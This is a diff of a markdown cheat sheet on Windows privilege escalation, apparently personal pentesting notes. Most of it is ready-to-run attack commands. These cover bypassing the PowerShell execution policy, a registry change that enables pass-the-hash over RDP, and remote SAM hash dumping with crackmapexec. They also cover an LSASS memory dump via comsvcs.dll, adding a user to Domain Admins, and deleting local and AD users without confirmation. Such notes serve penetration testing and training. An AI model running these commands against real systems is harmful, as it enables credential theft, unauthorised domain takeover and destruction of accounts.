@@ -1,5 +1,10 @@
 # Windows Priv Esc
 
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8034c6d9-6158-4997-802e-73b109446aa4)
+
+
 ## Credential hunting code chunks
 
 <img width="657" alt="Screen Shot 2022-08-06 at 2 44 39 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/96928590-0c83-4281-bbf9-cd0e5c5be354">
@@ -85,6 +90,10 @@ You can bypass the execution policy for the current PowerShell session by runnin
 Set-ExecutionPolicy Bypass -Scope Process
 ```
 
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/edf912cb-ea5f-4efc-b2c1-0b84f79aa9a4)
+
+
 To allow Pass-the-Hash (PTH) attacks over Remote Desktop Protocol (RDP) and disable Restricted Admin mode, you need to set the following registry value to 0
 ```
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0
@@ -92,7 +101,12 @@ Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Disab
 ```
 
 ## Privs
-
+```
+Get-LocalUser
+```
+```
+net user bob
+```
 ```
 whoami /priv
 ```
@@ -100,6 +114,12 @@ groups of user
 ```
 whoami /groups
 ```
+```
+Get-LocalGroup
+```
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b5257988-299c-4118-9b0b-cdb1b558df1c)
+
 
 ### priv attacks
 
@@ -131,7 +151,33 @@ powershell to enumerate open ports of a host
 `1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.129.25.115",$_)) "Port $_ is open!"} 2>$null`
 ```
 
+### Service Binary Hijacking
+
+Each Windows service is associated with a binary file that gets executed when the service is started or enters a running state. In this context, let's consider a situation where a software developer creates a program and installs it as a Windows service. During the installation process, the developer fails to secure the program's permissions properly, granting full Read and Write access to all members of the Users group. Consequently, a user with lower privileges could replace the program with a malicious one.
+
+To run the replaced binary, the user can either restart the service or, if the service is configured to start automatically, simply reboot the machine. Once the service restarts, the malicious binary will be executed with the service's privileges, such as LocalSystem.
+
+
+```
+When using a network logon such as WinRM or a bind shell, Get-CimInstance
+and Get-Service will result in a “permission denied” error when querying for
+services with a non-administrative user. Using an interactive logon such as RDP
+solves this problem.
+```
+
+
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+
+
+
 ## Process search
+
+```
+Get-Process
+```
 powershell code
 ```
 Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
@@ -196,7 +242,7 @@ Check cracking to see how to crack hashes, PTH tho?
 
 Extract Hashes from SAM Database with admin creds
 
-### Do the above remotly
+### Do the above remotely
 
 ```
 crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
@@ -243,6 +289,16 @@ PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 
 
 ## Move between 
 
+### Create user with .exe
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0b82cb14-8c8a-4002-8676-3885a8cb9062)
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8dd0966b-f566-409c-98d3-f17f840d9358)
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7ec65850-6bd5-4b23-aa62-62fdc4457f0d)
+
+
+
 ### get admin of DC create another admin user with powershell and active directory
 
 ```
@@ -263,6 +319,20 @@ Add-ADGroupMember -Identity "Domain Admins" -Members "ViviG"
 ```
 
 
+### Delete users
+Local
+```
+# Replace "UserToDelete" with the username of the user you want to delete.
+$UserToDelete = "UserToDelete"
+Remove-LocalUser -Name $UserToDelete
+```
+AD
+```
+# Replace "UserToDelete" with the username of the user you want to delete.
+$UserToDelete = "UserToDelete"
+Remove-ADUser -Identity $UserToDelete -Confirm:$false
+
+```
 ### PTH from inside windows
 
 ### Invoke the Hash smb
